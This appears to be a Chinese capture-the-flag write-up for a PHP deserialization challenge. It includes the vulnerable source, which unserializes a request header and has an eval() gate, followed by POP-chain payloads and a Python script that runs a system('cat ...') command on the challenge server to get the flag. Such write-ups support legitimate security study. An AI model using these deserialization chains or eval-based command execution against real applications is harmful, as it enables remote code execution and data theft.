@@ -1,0 +1,200 @@
+<?php
+
+# 根目录中有一个txt文件哦
+error_reporting(0);
+show_source(__FILE__);
+include("check.php");
+
+class EeE{
+    public $text;
+    public $eeee;
+    public function __wakeup(){
+        if ($this->text == "aaaa"){
+            echo lcfirst($this->text);
+        }
+    }
+
+    public function __get($kk){
+        echo "$kk,eeeeeeeeeeeee";
+    }
+
+    public function __clone(){
+        $a = new cycycycy;
+        $a -> aaa();
+    }
+    
+}
+
+class cycycycy{
+    public $a;
+    private $b;
+
+    public function aaa(){
+        $get = $_GET['get'];
+        $get = cipher($get);
+        if($get === "p8vfuv8g8v8py"){
+            eval($_POST["eval"]);
+        }
+    }
+
+
+    public function __invoke(){
+        $a_a = $this -> a;
+        echo "\$a_a\$";
+    }
+}
+
+class gBoBg{
+    public $name;
+    public $file;
+    public $coos;
+    private $eeee="-_-";
+    public function __toString(){
+        if(isset($this->name)){
+            $a = new $this->coos($this->file);
+            echo $a;
+        }else if(!isset($this -> file)){
+            return $this->coos->name;
+        }else{
+            $aa = $this->coos;
+            $bb = $this->file;
+            return $aa();
+        }
+    }
+}   
+
+class w_wuw_w{
+    public $aaa;
+    public $key;
+    public $file;
+    public function __wakeup(){
+        if(!preg_match("/php|63|\*|\?/i",$this -> key)){
+            $this->key = file_get_contents($this -> file);
+        }else{
+            echo "不行哦";
+        }
+    }
+
+    public function __destruct(){
+        echo $this->aaa;
+    }
+
+    public function __invoke(){
+        $this -> aaa = clone new EeE;
+    }
+}
+
+$_ip = $_SERVER["HTTP_AAAAAA"];
+unserialize($_ip);
+
+
+
+
+首先我们看到最下面这里是$ip = $SERVER["HTTP_AAAAAA"]; 这一句话的意思是接收header头中 aaaaaa参数的值，然后将其反序列化。 
+然后根据提示在根目录中有一个txt文件，但是这里我们不知道他的文件名字是什么。
+
+//获取文件名的序列化
+<?php
+class EeE
+{
+    public $text;
+    public $eeee;
+}
+
+class gBoBg
+{
+    public $name;
+    public $file;
+    public $coos;
+}
+
+$a=new EeE;
+$b=new gBoBg;
+$a->text=$b;
+$b->name="a";
+$b->file="/*.txt";
+$b->coos="GlobIterator";
+echo serialize($a);
+
+//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";s:1:"a";s:4:"file";s:6:"/*.txt";s:4:"coos";s:12:"GlobIterator";}s:4:"eeee";N;}
+
+//获取文件内容的序列化
+<?php
+class EeE{
+        public $text;
+        public $eeee;
+}
+class w_wuw_w{
+        public $aaa;
+        public $key;
+        public $file;
+}
+$a = new EeE;
+$b = new w_wuw_w;
+$a -> text = $b;
+$b -> file = "/h1nt.txt";
+$b -> aaa = &$b -> key;
+echo serialize($a);
+//O:3:"EeE":2:{s:4:"text";O:7:"w_wuw_w":3:{s:3:"aaa";N;s:3:"key";R:3;s:4:"file";s:9:"/h1nt.txt";}s:4:"eeee";N;}
+
+
+#用于check.php 
+key：qwertyuiopasdfghjklzxcvbnm123456789 
+move：2~4
+
+
+//到达aaa方法的序列化
+<?php
+class EeE{
+        public $text;
+        public $eeee;
+}
+class gBoBg{
+        public $name;
+        public $file;
+        public $coos;
+}
+class w_wuw_w{
+        public $aaa;
+        public $key;
+        public $file;
+}
+class cycycycy{
+        
+}
+
+$a = new EeE;
+$b = new gBoBg;
+$c = new w_wuw_w;
+$a -> text = $b;
+$b -> file="a";
+$b -> coos = $c;
+$c -> aaa = $a;
+echo serialize($a);
+
+//O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:1:"a";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";r:1;s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}
+
+最终脚本：
+import requests
+import re
+
+mi = ['i6xstx6d6x6ir','u5zarz5s5z5ue','y4lpel4a4l4yw','sqnhonqjqnqsi','dwmjpmwkwmwdo','fe1ka1ele1efp']
+d = 1
+while d<2:
+    for i in mi:
+        data = {
+            'eval':'system("cat /f1agaaa");'
+        }
+        url = f"http://c77fb5f3-778a-4a3c-ba16-62701392c7a9.challenge.ctf.show/index.php?get={i}"
+        header = {
+            'aaaaaa':'O:3:"EeE":2:{s:4:"text";O:5:"gBoBg":3:{s:4:"name";N;s:4:"file";s:1:"a";s:4:"coos";O:7:"w_wuw_w":3:{s:3:"aaa";r:1;s:3:"key";N;s:4:"file";N;}}s:4:"eeee";N;}'
+        }
+        reqpose = requests.post(url=url,data=data,headers=header).text
+        re_text = re.findall(r"(?<=</code>).*", reqpose, re.S)
+        if '' not in re_text:
+            print(re_text[0])
+            d += 1
+            
+   
+  flag:ctfshow{a323ae65-14b6-46e4-9925-10e108013363}
+  
